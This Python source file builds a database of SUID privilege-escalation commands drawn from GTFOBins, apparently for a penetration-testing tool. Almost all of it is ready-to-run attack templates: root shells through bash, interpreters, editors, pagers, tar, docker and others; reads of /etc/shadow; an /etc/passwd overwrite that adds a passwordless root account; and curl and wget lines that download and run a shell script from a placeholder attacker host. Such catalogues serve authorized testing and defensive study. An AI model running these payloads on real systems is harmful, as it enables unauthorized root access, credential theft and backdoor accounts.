"""
GTFOBins Database
=================

Comprehensive database of GTFOBins SUID exploitation techniques.

Reference: https://gtfobins.github.io/
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum


class ExploitType(Enum):
    """Type of exploitation technique"""
    SHELL = "shell"  # Spawns interactive shell
    COMMAND = "command"  # Executes arbitrary command
    FILE_READ = "file_read"  # Reads arbitrary files
    FILE_WRITE = "file_write"  # Writes arbitrary files
    SUID = "suid"  # SUID-specific exploitation


@dataclass
class ExploitTechnique:
    """
    Single exploitation technique for a binary.

    Attributes:
        command: The exploit command template
        exploit_type: Type of exploitation
        description: Human-readable description
        interactive: Requires interactive terminal
        test_command: Non-interactive test version (replaces shell with 'id')
    """
    command: str
    exploit_type: ExploitType
    description: str
    interactive: bool = False
    test_command: Optional[str] = None


@dataclass
class BinaryExploits:
    """
    All exploitation techniques for a specific binary.

    Attributes:
        name: Binary name
        techniques: List of exploitation techniques
        notes: Additional notes for exploitation
        url: GTFOBins URL
    """
    name: str
    techniques: List[ExploitTechnique]
    notes: str = ""
    url: str = field(default="")

    def __post_init__(self):
        if not self.url:
            self.url = f"https://gtfobins.github.io/gtfobins/{self.name}/#suid"


class GTFOBinsDB:
    """
    GTFOBins exploitation database.

    Contains SUID exploitation techniques for known binaries.
    """

    def __init__(self):
        self._db: Dict[str, BinaryExploits] = {}
        self._load_database()

    def _load_database(self) -> None:
        """Load all GTFOBins SUID exploits"""

        # ═══════════════════════════════════════════════════════════
        # SHELLS & INTERPRETERS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="bash",
            techniques=[
                ExploitTechnique(
                    command="bash -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn privileged bash shell",
                    interactive=True,
                    test_command="bash -p -c 'id'"
                )
            ],
            notes="The -p flag preserves effective UID"
        ))

        self._add_binary(BinaryExploits(
            name="sh",
            techniques=[
                ExploitTechnique(
                    command="sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn privileged sh shell",
                    interactive=True,
                    test_command="sh -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="dash",
            techniques=[
                ExploitTechnique(
                    command="dash -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn privileged dash shell",
                    interactive=True,
                    test_command="dash -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="zsh",
            techniques=[
                ExploitTechnique(
                    command="zsh",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn zsh shell (doesn't drop privs by default)",
                    interactive=True,
                    test_command="zsh -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="csh",
            techniques=[
                ExploitTechnique(
                    command="csh -b",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn csh shell",
                    interactive=True,
                    test_command="csh -c 'id'"
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # SCRIPTING LANGUAGES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="python",
            techniques=[
                ExploitTechnique(
                    command="python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="setuid(0) then spawn shell",
                    interactive=True,
                    test_command="python -c 'import os; os.setuid(0); os.system(\"id\")'"
                ),
                ExploitTechnique(
                    command="python -c 'import pty; pty.spawn(\"/bin/sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn PTY shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="python3",
            techniques=[
                ExploitTechnique(
                    command="python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="setuid(0) then spawn shell",
                    interactive=True,
                    test_command="python3 -c 'import os; os.setuid(0); os.system(\"id\")'"
                ),
                ExploitTechnique(
                    command="python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn PTY shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="perl",
            techniques=[
                ExploitTechnique(
                    command="perl -e 'exec \"/bin/sh\";'",
                    exploit_type=ExploitType.SHELL,
                    description="Exec shell directly",
                    interactive=True,
                    test_command="perl -e 'exec \"id\";'"
                ),
                ExploitTechnique(
                    command="perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
                    exploit_type=ExploitType.SHELL,
                    description="setuid(0) then exec shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="ruby",
            techniques=[
                ExploitTechnique(
                    command="ruby -e 'exec \"/bin/sh\"'",
                    exploit_type=ExploitType.SHELL,
                    description="Exec shell directly",
                    interactive=True,
                    test_command="ruby -e 'exec \"id\"'"
                ),
                ExploitTechnique(
                    command="ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
                    exploit_type=ExploitType.SHELL,
                    description="setuid(0) then exec shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="php",
            techniques=[
                ExploitTechnique(
                    command="php -r \"system('/bin/sh');\"",
                    exploit_type=ExploitType.SHELL,
                    description="System call to shell",
                    interactive=True,
                    test_command="php -r \"system('id');\""
                ),
                ExploitTechnique(
                    command="php -r \"passthru('/bin/sh');\"",
                    exploit_type=ExploitType.SHELL,
                    description="Passthru to shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="lua",
            techniques=[
                ExploitTechnique(
                    command="lua -e 'os.execute(\"/bin/sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="Execute shell via os.execute",
                    interactive=True,
                    test_command="lua -e 'os.execute(\"id\")'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="node",
            techniques=[
                ExploitTechnique(
                    command="node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via child_process",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="tclsh",
            techniques=[
                ExploitTechnique(
                    command="tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr",
                    exploit_type=ExploitType.SHELL,
                    description="Exec shell from tclsh",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # TEXT EDITORS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="vim",
            techniques=[
                ExploitTechnique(
                    command="vim -c ':!/bin/sh'",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from vim",
                    interactive=True
                ),
                ExploitTechnique(
                    command="vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="Python3 setuid in vim",
                    interactive=True
                ),
                ExploitTechnique(
                    command="vim -c ':set shell=/bin/sh' -c ':shell'",
                    exploit_type=ExploitType.SHELL,
                    description="Set shell and execute",
                    interactive=True
                )
            ],
            notes="Vim has multiple exploitation paths. Try :!sh first."
        ))

        self._add_binary(BinaryExploits(
            name="vi",
            techniques=[
                ExploitTechnique(
                    command="vi -c ':!/bin/sh' /dev/null",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from vi",
                    interactive=True
                ),
                ExploitTechnique(
                    command="vi -c ':set shell=/bin/sh' -c ':shell'",
                    exploit_type=ExploitType.SHELL,
                    description="Set shell and execute",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="nano",
            techniques=[
                ExploitTechnique(
                    command="nano\n^R^X\nreset; sh 1>&0 2>&0",
                    exploit_type=ExploitType.SHELL,
                    description="Ctrl+R, Ctrl+X to execute command",
                    interactive=True
                )
            ],
            notes="Press Ctrl+R then Ctrl+X to execute commands"
        ))

        self._add_binary(BinaryExploits(
            name="emacs",
            techniques=[
                ExploitTechnique(
                    command="emacs -Q -nw --eval '(term \"/bin/sh\")'",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn terminal in emacs",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="ed",
            techniques=[
                ExploitTechnique(
                    command="ed\n!/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from ed",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # FILE VIEWERS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="less",
            techniques=[
                ExploitTechnique(
                    command="less /etc/passwd\n!/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from less",
                    interactive=True
                )
            ],
            notes="Type !sh or !/bin/sh while viewing a file"
        ))

        self._add_binary(BinaryExploits(
            name="more",
            techniques=[
                ExploitTechnique(
                    command="more /etc/passwd\n!/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from more",
                    interactive=True
                )
            ],
            notes="Type !sh while viewing a file"
        ))

        self._add_binary(BinaryExploits(
            name="man",
            techniques=[
                ExploitTechnique(
                    command="man man\n!/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from man",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # FILE UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="find",
            techniques=[
                ExploitTechnique(
                    command="find . -exec /bin/sh -p \\; -quit",
                    exploit_type=ExploitType.SHELL,
                    description="Execute shell via -exec",
                    interactive=True,
                    test_command="find . -exec id \\; -quit"
                ),
                ExploitTechnique(
                    command="find . -exec /bin/bash -p \\; -quit",
                    exploit_type=ExploitType.SHELL,
                    description="Execute bash via -exec",
                    interactive=True
                )
            ],
            notes="The -quit stops after first execution"
        ))

        self._add_binary(BinaryExploits(
            name="cp",
            techniques=[
                ExploitTechnique(
                    command="LFILE=/etc/shadow\ncp \"$LFILE\" /tmp/shadow_copy",
                    exploit_type=ExploitType.FILE_READ,
                    description="Copy sensitive files"
                ),
                ExploitTechnique(
                    command="echo 'hacker::0:0::/root:/bin/bash' | cp /dev/stdin /etc/passwd",
                    exploit_type=ExploitType.FILE_WRITE,
                    description="Overwrite passwd (dangerous!)"
                )
            ],
            notes="Use cp to read/write arbitrary files"
        ))

        self._add_binary(BinaryExploits(
            name="cat",
            techniques=[
                ExploitTechnique(
                    command="cat /etc/shadow",
                    exploit_type=ExploitType.FILE_READ,
                    description="Read sensitive files"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="dd",
            techniques=[
                ExploitTechnique(
                    command="dd if=/etc/shadow",
                    exploit_type=ExploitType.FILE_READ,
                    description="Read files with dd"
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # TEXT PROCESSING
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="awk",
            techniques=[
                ExploitTechnique(
                    command="awk 'BEGIN {system(\"/bin/sh\")}'",
                    exploit_type=ExploitType.SHELL,
                    description="System call from awk",
                    interactive=True,
                    test_command="awk 'BEGIN {system(\"id\")}'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="gawk",
            techniques=[
                ExploitTechnique(
                    command="gawk 'BEGIN {system(\"/bin/sh\")}'",
                    exploit_type=ExploitType.SHELL,
                    description="System call from gawk",
                    interactive=True,
                    test_command="gawk 'BEGIN {system(\"id\")}'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="sed",
            techniques=[
                ExploitTechnique(
                    command="sed -n '1e exec sh 1>&0' /etc/hosts",
                    exploit_type=ExploitType.SHELL,
                    description="Execute via sed -e",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # NETWORK TOOLS
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="nmap",
            techniques=[
                ExploitTechnique(
                    command="TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF",
                    exploit_type=ExploitType.SHELL,
                    description="Execute Lua script",
                    interactive=True
                ),
                ExploitTechnique(
                    command="nmap --interactive\n!sh",
                    exploit_type=ExploitType.SHELL,
                    description="Interactive mode (old nmap)",
                    interactive=True
                )
            ],
            notes="Interactive mode removed in newer nmap versions"
        ))

        self._add_binary(BinaryExploits(
            name="socat",
            techniques=[
                ExploitTechnique(
                    command="socat stdin exec:/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Exec shell via socat",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="wget",
            techniques=[
                ExploitTechnique(
                    command="TF=$(mktemp)\nchmod +x $TF\nwget http://ATTACKER/shell.sh -O $TF\n$TF",
                    exploit_type=ExploitType.COMMAND,
                    description="Download and execute"
                )
            ],
            notes="Requires attacker-controlled server"
        ))

        self._add_binary(BinaryExploits(
            name="curl",
            techniques=[
                ExploitTechnique(
                    command="curl http://ATTACKER/shell.sh | sh",
                    exploit_type=ExploitType.COMMAND,
                    description="Download and pipe to shell"
                )
            ],
            notes="Requires attacker-controlled server"
        ))

        # ═══════════════════════════════════════════════════════════
        # ARCHIVE UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="tar",
            techniques=[
                ExploitTechnique(
                    command="tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Checkpoint action execution",
                    interactive=True,
                    test_command="tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id"
                )
            ],
            notes="Checkpoint action is powerful for arbitrary execution"
        ))

        self._add_binary(BinaryExploits(
            name="zip",
            techniques=[
                ExploitTechnique(
                    command="TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF",
                    exploit_type=ExploitType.SHELL,
                    description="Test function with shell",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="gzip",
            techniques=[
                ExploitTechnique(
                    command="gzip -f /etc/shadow -t",
                    exploit_type=ExploitType.FILE_READ,
                    description="Read file via test mode"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="cpio",
            techniques=[
                ExploitTechnique(
                    command="echo '/etc/shadow' | cpio -o",
                    exploit_type=ExploitType.FILE_READ,
                    description="Read files via archive"
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # VERSION CONTROL
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="git",
            techniques=[
                ExploitTechnique(
                    command="git help status\n!/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from git help",
                    interactive=True
                ),
                ExploitTechnique(
                    command="PAGER='sh -c \"exec sh 0<&1\"' git -p help",
                    exploit_type=ExploitType.SHELL,
                    description="Custom pager exploitation",
                    interactive=True
                )
            ]
        ))

        # ═══════════════════════════════════════════════════════════
        # MISC UTILITIES
        # ═══════════════════════════════════════════════════════════

        self._add_binary(BinaryExploits(
            name="env",
            techniques=[
                ExploitTechnique(
                    command="env /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via env",
                    interactive=True,
                    test_command="env /bin/sh -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="xargs",
            techniques=[
                ExploitTechnique(
                    command="xargs -a /dev/null sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via xargs",
                    interactive=True,
                    test_command="xargs -a /dev/null sh -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="time",
            techniques=[
                ExploitTechnique(
                    command="time /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via time",
                    interactive=True,
                    test_command="time /bin/sh -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="timeout",
            techniques=[
                ExploitTechnique(
                    command="timeout 7d /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via timeout",
                    interactive=True,
                    test_command="timeout 1s /bin/sh -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="strace",
            techniques=[
                ExploitTechnique(
                    command="strace -o /dev/null /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via strace",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="ltrace",
            techniques=[
                ExploitTechnique(
                    command="ltrace -L /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via ltrace",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="nice",
            techniques=[
                ExploitTechnique(
                    command="nice /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via nice",
                    interactive=True,
                    test_command="nice /bin/sh -p -c 'id'"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="ionice",
            techniques=[
                ExploitTechnique(
                    command="ionice /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via ionice",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="taskset",
            techniques=[
                ExploitTechnique(
                    command="taskset 1 /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via taskset",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="watch",
            techniques=[
                ExploitTechnique(
                    command="watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via watch",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="screen",
            techniques=[
                ExploitTechnique(
                    command="screen",
                    exploit_type=ExploitType.SHELL,
                    description="Screen spawns shell with SUID privs",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="tmux",
            techniques=[
                ExploitTechnique(
                    command="tmux",
                    exploit_type=ExploitType.SHELL,
                    description="Tmux spawns shell with SUID privs",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="expect",
            techniques=[
                ExploitTechnique(
                    command="expect -c 'spawn /bin/sh -p; interact'",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via expect",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="rlwrap",
            techniques=[
                ExploitTechnique(
                    command="rlwrap /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via rlwrap",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="script",
            techniques=[
                ExploitTechnique(
                    command="script -q /dev/null /bin/sh -p",
                    exploit_type=ExploitType.SHELL,
                    description="Spawn shell via script",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="gdb",
            techniques=[
                ExploitTechnique(
                    command="gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
                    exploit_type=ExploitType.SHELL,
                    description="setuid via gdb python",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="ftp",
            techniques=[
                ExploitTechnique(
                    command="ftp\n!/bin/sh",
                    exploit_type=ExploitType.SHELL,
                    description="Shell escape from ftp",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="ssh",
            techniques=[
                ExploitTechnique(
                    command="ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
                    exploit_type=ExploitType.SHELL,
                    description="Shell via ProxyCommand",
                    interactive=True
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="docker",
            techniques=[
                ExploitTechnique(
                    command="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    exploit_type=ExploitType.SHELL,
                    description="Mount host filesystem in container",
                    interactive=True
                )
            ],
            notes="This gives full root access to the host system"
        ))

        self._add_binary(BinaryExploits(
            name="openssl",
            techniques=[
                ExploitTechnique(
                    command="openssl enc -in /etc/shadow",
                    exploit_type=ExploitType.FILE_READ,
                    description="Read files via openssl"
                )
            ]
        ))

        self._add_binary(BinaryExploits(
            name="base64",
            techniques=[
                ExploitTechnique(
                    command="base64 /etc/shadow | base64 -d",
                    exploit_type=ExploitType.FILE_READ,
                    description="Read files via base64"
                )
            ]
        ))

    def _add_binary(self, binary: BinaryExploits) -> None:
        """Add binary to database"""
        self._db[binary.name] = binary

    def get(self, name: str) -> Optional[BinaryExploits]:
        """Get exploitation techniques for a binary"""
        return self._db.get(name)

    def has(self, name: str) -> bool:
        """Check if binary is in database"""
        return name in self._db

    def all_binaries(self) -> List[str]:
        """Get list of all known binaries"""
        return list(self._db.keys())

    def __len__(self) -> int:
        return len(self._db)

    def __contains__(self, name: str) -> bool:
        return name in self._db